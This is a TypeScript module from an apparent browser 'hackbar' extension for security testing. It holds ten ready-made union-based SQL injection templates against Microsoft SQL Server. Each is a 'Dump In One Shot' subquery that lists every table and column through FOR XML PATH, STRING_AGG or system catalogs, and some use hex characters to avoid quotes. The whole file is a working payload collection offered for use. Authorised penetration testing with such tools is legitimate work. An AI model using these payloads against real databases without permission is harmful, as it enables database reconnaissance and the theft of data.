/**
 * XEOO HACKBAR — Security Testing & HTTP Inspection Chrome Extension
 * 
 * @module UnionBasedDiosMssql
 * @author Zone Xploiter / ZXMarchia
 * @license MIT
 * @description Union-Based Microsoft SQL Server (MSSQL) Dump In One Shot templates.
 */

import { BuilderSubcategory, BuilderTemplate } from '../../types';

export const diosMssqlTemplates: BuilderTemplate[] = [
  {
    id: 'dios-mssql-for-xml-path',
    name: 'FOR XML PATH(\'\') Standard DIOS',
    tags: ['mssql', 'xml-path', 'standard'],
    description: 'Microsoft SQL Server classic schema and column dump via FOR XML PATH',
    content: "(SELECT table_name + ':' + column_name + CHAR(10) FROM information_schema.columns FOR XML PATH(''))"
  },
  {
    id: 'dios-mssql-xml-path-br',
    name: 'FOR XML PATH(\'\') with <br> Delimiter',
    tags: ['mssql', 'xml-path', 'html'],
    description: 'FOR XML PATH extraction with HTML break line delimiter',
    content: "(SELECT table_name + ' -> ' + column_name + '<br>' FROM information_schema.columns FOR XML PATH(''))"
  },
  {
    id: 'dios-mssql-string-agg',
    name: 'STRING_AGG() DIOS (MSSQL 2017+)',
    tags: ['mssql', 'string_agg', 'modern'],
    description: 'Modern MSSQL 2017+ string aggregation DIOS',
    content: "(SELECT STRING_AGG(table_name + ':' + column_name, CHAR(10)) FROM information_schema.columns)"
  },
  {
    id: 'dios-mssql-sys-tables-columns',
    name: 'sys.tables & sys.columns Catalog DIOS',
    tags: ['mssql', 'sys-catalog', 'internal'],
    description: 'Internal sys schema catalog dump bypassing information_schema',
    content: "(SELECT t.name + ':' + c.name + CHAR(10) FROM sys.tables t JOIN sys.columns c ON t.object_id=c.object_id FOR XML PATH(''))"
  },
  {
    id: 'dios-mssql-sysobjects-legacy',
    name: 'sysobjects & syscolumns (Legacy MSSQL)',
    tags: ['mssql', 'sysobjects', 'legacy'],
    description: 'Legacy MSSQL 2000/2005/2008 system objects extraction',
    content: "(SELECT o.name + ':' + c.name + CHAR(10) FROM sysobjects o JOIN syscolumns c ON o.id=c.id WHERE o.xtype='U' FOR XML PATH(''))"
  },
  {
    id: 'dios-mssql-all-catalogs',
    name: 'Multi-Database / All DBs MSSQL DIOS',
    tags: ['mssql', 'all-db', 'dump'],
    description: 'Extract database, table, and column names across all accessible databases',
    content: "(SELECT table_catalog + '.' + table_name + ':' + column_name + CHAR(10) FROM information_schema.columns FOR XML PATH(''))"
  },
  {
    id: 'dios-mssql-char-hex',
    name: 'CHAR(0x3a) Hex Delimiter DIOS',
    tags: ['mssql', 'char-hex', 'unquoted'],
    description: 'Unquoted colon and newline separators using CHAR(0x3a) and CHAR(0x0a)',
    content: "(SELECT table_name + CHAR(0x3a) + column_name + CHAR(0x0a) FROM information_schema.columns FOR XML PATH(''))"
  },
  {
    id: 'dios-mssql-convert-hex',
    name: 'CONVERT(varchar, 0x3a) Hex DIOS',
    tags: ['mssql', 'convert', 'hex-binary'],
    description: 'Dynamic hex literal conversion via CONVERT(varchar, 0x3a)',
    content: "(SELECT table_name + CONVERT(varchar, 0x3a) + column_name + CONVERT(varchar, 0x0a) FROM information_schema.columns FOR XML PATH(''))"
  },
  {
    id: 'dios-mssql-string-agg-hex',
    name: 'STRING_AGG() CHAR(0x3a) Modern DIOS',
    tags: ['mssql', 'string_agg', 'char-hex'],
    description: 'Modern string aggregation with hex-based ASCII separators',
    content: "(SELECT STRING_AGG(table_name + CHAR(0x3a) + column_name, CHAR(0x0a)) FROM information_schema.columns)"
  },
  {
    id: 'dios-mssql-sys-tables-catalog',
    name: 'sys.tables & sys.columns Catalog DIOS',
    tags: ['mssql', 'sys-tables', 'catalog'],
    description: 'Direct SQL Server system catalog extraction without using information_schema',
    content: "(SELECT t.name + ':' + c.name + CHAR(10) FROM sys.tables t JOIN sys.columns c ON t.object_id = c.object_id FOR XML PATH(''))"
  }
];

export const diosMssqlSubcategory: BuilderSubcategory = {
  id: 'dios-mssql',
  label: 'DIOS MSSQL',
  description: 'Microsoft SQL Server Dump In One Shot (DIOS) templates (FOR XML PATH, STRING_AGG, sys.tables, CHAR hex)',
  templates: diosMssqlTemplates
};
